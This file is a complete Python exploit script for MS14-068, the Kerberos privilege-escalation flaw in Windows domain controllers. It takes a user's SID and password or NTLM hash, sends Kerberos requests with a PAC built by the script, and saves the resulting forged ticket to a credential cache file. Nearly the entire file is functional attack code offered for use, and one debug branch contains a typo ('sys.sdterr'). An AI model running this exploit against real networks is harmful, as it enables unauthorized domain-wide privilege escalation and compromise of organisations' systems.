#!/usr/bin/python

# MS14-068 Exploit

# Author
# ------
# Sylvain Monne
# Contact : sylvain dot monne at solucom dot fr
# http://twitter.com/bidord



import sys, os
from random import getrandbits
from time import time, localtime, strftime

from kek.ccache import CCache, get_tgt_cred, kdc_rep2ccache
from kek.crypto import generate_subkey, ntlm_hash, RC4_HMAC, HMAC_MD5
from kek.krb5 import build_as_req, build_tgs_req, send_req, recv_rep, \
    decrypt_as_rep, decrypt_tgs_rep, decrypt_ticket_enc_part, iter_authorization_data, \
    AD_WIN2K_PAC
from kek.pac import build_pac, pretty_print_pac
from kek.util import epoch2gt, gt2epoch


def sploit(user_realm, user_name, user_sid, user_key, kdc_a, kdc_b, target_realm, target_service, target_host,
           output_filename, krbtgt_a_key=None, trust_ab_key=None, target_key=None):

    sys.stderr.write('  [+] Building AS-REQ for %s...' % kdc_a)
    sys.stderr.flush()
    nonce = getrandbits(31)
    current_time = time()
    as_req = build_as_req(user_realm, user_name, user_key, current_time, nonce, pac_request=False)
    sys.stderr.write(' Done!\n')
    
    sys.stderr.write('  [+] Sending AS-REQ to %s...' % kdc_a)
    sys.stderr.flush()
    sock = send_req(as_req, kdc_a)
    sys.stderr.write(' Done!\n')

    sys.stderr.write('  [+] Receiving AS-REP from %s...' % kdc_a)
    sys.stderr.flush()
    data = recv_rep(sock)
    sys.stderr.write(' Done!\n')

    sys.stderr.write('  [+] Parsing AS-REP from %s...' % kdc_a)
    sys.stderr.flush()
    as_rep, as_rep_enc = decrypt_as_rep(data, user_key)
    session_key = (int(as_rep_enc['key']['keytype']), str(as_rep_enc['key']['keyvalue']))
    logon_time = gt2epoch(str(as_rep_enc['authtime']))
    tgt_a = as_rep['ticket']
    sys.stderr.write(' Done!\n')


    if krbtgt_a_key is not None:
        print >> sys.sdterr, as_rep.prettyPrint()
        print >> sys.stderr, as_rep_enc.prettyPrint()
        ticket_debug(tgt_a, krbtgt_a_key)
    
    sys.stderr.write('  [+] Building TGS-REQ for %s...' % kdc_a)
    sys.stderr.flush()
    subkey = generate_subkey()
    nonce = getrandbits(31)
    current_time = time()
    pac = (AD_WIN2K_PAC, build_pac(user_realm, user_name, user_sid, logon_time))
    tgs_req = build_tgs_req(user_realm, 'krbtgt', target_realm, user_realm, user_name,
                            tgt_a, session_key, subkey, nonce, current_time, pac, pac_request=False)
    sys.stderr.write(' Done!\n')

    sys.stderr.write('  [+] Sending TGS-REQ to %s...' % kdc_a)
    sys.stderr.flush()
    sock = send_req(tgs_req, kdc_a)
    sys.stderr.write(' Done!\n')

    sys.stderr.write('  [+] Receiving TGS-REP from %s...' % kdc_a)
    sys.stderr.flush()
    data = recv_rep(sock)
    sys.stderr.write(' Done!\n')

    sys.stderr.write('  [+] Parsing TGS-REP from %s...' % kdc_a)
    tgs_rep, tgs_rep_enc = decrypt_tgs_rep(data, subkey)
    session_key2 = (int(tgs_rep_enc['key']['keytype']), str(tgs_rep_enc['key']['keyvalue']))
    tgt_b = tgs_rep['ticket']
    sys.stderr.write(' Done!\n')


    if trust_ab_key is not None:
        pretty_print_pac(pac[1])
        print >> sys.stderr, tgs_rep.prettyPrint()
        print >> sys.stderr, tgs_rep_enc.prettyPrint()
        ticket_debug(tgt_b, trust_ab_key)


    if target_service is not None and target_host is not None and kdc_b is not None:
        sys.stderr.write('  [+] Building TGS-REQ for %s...' % kdc_b)
        sys.stderr.flush()
        subkey = generate_subkey()
        nonce = getrandbits(31)
        current_time = time()
        tgs_req2 = build_tgs_req(target_realm, target_service, target_host, user_realm, user_name,
                                tgt_b, session_key2, subkey, nonce, current_time)
        sys.stderr.write(' Done!\n')

        sys.stderr.write('  [+] Sending TGS-REQ to %s...' % kdc_b)
        sys.stderr.flush()
        sock = send_req(tgs_req2, kdc_b)
        sys.stderr.write(' Done!\n')

        sys.stderr.write('  [+] Receiving TGS-REP from %s...' % kdc_b)
        sys.stderr.flush()
        data = recv_rep(sock)
        sys.stderr.write(' Done!\n')

        sys.stderr.write('  [+] Parsing TGS-REP from %s...' % kdc_b)
        tgs_rep2, tgs_rep_enc2 = decrypt_tgs_rep(data, subkey)
        sys.stderr.write(' Done!\n')

    else:
        tgs_rep2 = tgs_rep
        tgs_rep_enc2 = tgs_rep_enc

    sys.stderr.write('  [+] Creating ccache file %r...' % output_filename)
    cc = CCache((user_realm, user_name))
    tgs_cred = kdc_rep2ccache(tgs_rep2, tgs_rep_enc2)
    cc.add_credential(tgs_cred)
    cc.save(output_filename)
    sys.stderr.write(' Done!\n')


    if target_key is not None:
        print >> sys.stderr, tgs_rep2.prettyPrint()
        print >> sys.stderr, tgs_rep_enc2.prettyPrint()
        ticket_debug(tgs_rep2['ticket'], target_key)


# Pretty print full ticket content
# Only possible in a lab environment when you already know krbtgt and/or service keys
def ticket_debug(ticket, key):
    try:
        ticket_enc = decrypt_ticket_enc_part(ticket, key)
        print >> sys.stderr, ticket.prettyPrint()
        for ad in iter_authorization_data(ticket_enc['authorization-data']):
            print >> sys.stderr, 'AUTHORIZATION-DATA (type: %d):' % ad['ad-type']
            if ad['ad-type'] == AD_WIN2K_PAC:
                pretty_print_pac(str(ad['ad-data']))
            else:
                print >> sys.stderr, str(ad['ad-data']).encode('hex')
    except Exception as e:
        print 'ERROR:', e


if __name__ == '__main__':
    from getopt import getopt
    from getpass import getpass

    def usage_and_exit():
        print >> sys.stderr, 'USAGE:'
        print >> sys.stderr, '%s -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr>' % sys.argv[0]
        print >> sys.stderr, ''
        print >> sys.stderr, 'OPTIONS:'
        print >> sys.stderr, '    -p <clearPassword>'
        print >> sys.stderr, ' --rc4 <ntlmHash>'
        sys.exit(1)

    opts, args = getopt(sys.argv[1:], 'u:s:d:p:', ['rc4='])
    opts = dict(opts)
    if not all(k in opts for k in ('-u', '-s', '-d')):
        usage_and_exit()

    user_name, user_realm = opts['-u'].split('@', 1)
    user_sid = opts['-s']
    kdc_a = opts['-d']

    if '--rc4' in opts:
        user_key = (RC4_HMAC, opts['--rc4'].decode('hex'))
        assert len(user_key[1]) == 16
    elif '-p' in opts:
        user_key = (RC4_HMAC, ntlm_hash(opts['-p']).digest())
    else:
        user_key = (RC4_HMAC, ntlm_hash(getpass('Password: ')).digest())

    target_realm = user_realm
    target_service = target_host = kdc_b = None
    filename = 'TGT_%s@%s.ccache' % (user_name, user_realm)

    user_realm = user_realm.upper()
    target_realm = target_realm.upper()

    sploit(user_realm, user_name, user_sid, user_key, kdc_a, kdc_b, target_realm, target_service, target_host, filename)
